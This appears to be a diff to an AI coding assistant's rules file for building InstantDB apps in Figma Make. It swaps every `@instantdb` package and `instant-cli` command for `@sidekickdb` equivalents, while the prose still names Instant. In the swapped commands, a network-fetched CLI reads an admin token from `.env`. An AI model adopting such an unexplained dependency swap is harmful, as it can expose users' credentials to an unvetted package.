@@ -3,7 +3,7 @@ Act as a world-class senior frontend engineer with deep expertise in InstantDB a
 # Additional rules for Figma Make
 
 - In your app code, hardcode the app id (don't read it from `process.env` in the bundle).
-- But DO create a `.env` with `VITE_INSTANT_APP_ID=...` and `INSTANT_ADMIN_TOKEN=...`. The `instant-cli` reads these, so `pnpm dlx instant-cli` works without logging in.
+- But DO create a `.env` with `VITE_INSTANT_APP_ID=...` and `INSTANT_ADMIN_TOKEN=...`. The `sidekick-cli` reads these, so `pnpm dlx --package=@sidekickdb/cli sidekick-cli` works without logging in.
 
 # About InstantDB aka Instant
 
@@ -13,13 +13,13 @@ Instant is a client-side database (Modern Firebase) with built-in queries, trans
 
 Instant provides client-side JS SDKs and an admin SDK:
 
-- `@instantdb/core` --- vanilla JS
-- `@instantdb/react` --- React
-- `@instantdb/react-native` --- React Native / Expo
-- `@instantdb/solidjs` --- SolidJS
-- `@instantdb/svelte` --- Svelte
-- `@instantdb/vue` --- Vue
-- `@instantdb/admin` --- backend scripts / servers
+- `@sidekickdb/core` --- vanilla JS
+- `@sidekickdb/react` --- React
+- `@sidekickdb/react-native` --- React Native / Expo
+- `@sidekickdb/solidjs` --- SolidJS
+- `@sidekickdb/svelte` --- Svelte
+- `@sidekickdb/vue` --- Vue
+- `@sidekickdb/admin` --- backend scripts / servers
 
 # Managing Instant Apps
 
@@ -30,7 +30,7 @@ Create your `.env` file with the credentials from this document.
 If you have an app id/admin token but no schema/perm files, pull them:
 
 ```bash
-pnpm dlx instant-cli pull --yes
+pnpm dlx --package=@sidekickdb/cli sidekick-cli pull --yes
 ```
 
 ## Schema changes
@@ -38,7 +38,7 @@ pnpm dlx instant-cli pull --yes
 Edit `instant.schema.ts`, then push:
 
 ```bash
-pnpm dlx instant-cli push schema --yes
+pnpm dlx --package=@sidekickdb/cli sidekick-cli push schema --yes
 ```
 
 New fields = additions; missing fields = deletions.
@@ -46,7 +46,7 @@ New fields = additions; missing fields = deletions.
 To rename fields:
 
 ```bash
-pnpm dlx instant-cli push schema --rename 'posts.author:posts.creator stores.owner:stores.manager' --yes
+pnpm dlx --package=@sidekickdb/cli sidekick-cli push schema --rename 'posts.author:posts.creator stores.owner:stores.manager' --yes
 ```
 
 ## Permission changes
@@ -54,7 +54,7 @@ pnpm dlx instant-cli push schema --rename 'posts.author:posts.creator stores.own
 Edit `instant.perms.ts`, then push:
 
 ```bash
-pnpm dlx instant-cli push perms --yes
+pnpm dlx --package=@sidekickdb/cli sidekick-cli push perms --yes
 ```
 
 # CRITICAL Query Guidelines
@@ -285,11 +285,11 @@ Always pass `schema` when initializing Instant to get type safety for queries an
 import schema from '@/instant.schema';
 
 // On client
-import { init } from '@instantdb/react'; // or your relevant Instant SDK
+import { init } from '@sidekickdb/react'; // or your relevant Instant SDK
 const clientDb = init({ appId, schema });
 
 // On backend
-import { init } from '@instantdb/admin';
+import { init } from '@sidekickdb/admin';
 const adminDb = init({ appId, adminToken, schema });
 ```
 
@@ -298,7 +298,7 @@ const adminDb = init({ appId, adminToken, schema });
 Always use `id()` to generate ids for new entities
 
 ```tsx
-import { id } from '@instantdb/react'; // or your relevant Instant SDK
+import { id } from '@sidekickdb/react'; // or your relevant Instant SDK
 import { clientDb } from '@/lib/clientDb';
 clientDb.transact(clientDb.tx.todos[id()].create({ title: 'New Todo' }));
 ```
@@ -379,7 +379,7 @@ if (created) {
 
 # Ad-hoc queries from the CLI
 
-Run `pnpm dlx instant-cli query '{ posts: {} }' --admin` to query your app. A context flag is required: `--admin`, `--as-email <email>`, or `--as-guest`. Also supports `--app <id>`.
+Run `pnpm dlx --package=@sidekickdb/cli sidekick-cli query '{ posts: {} }' --admin` to query your app. A context flag is required: `--admin`, `--as-email <email>`, or `--as-guest`. Also supports `--app <id>`.
 
 # Instant Documentation
 
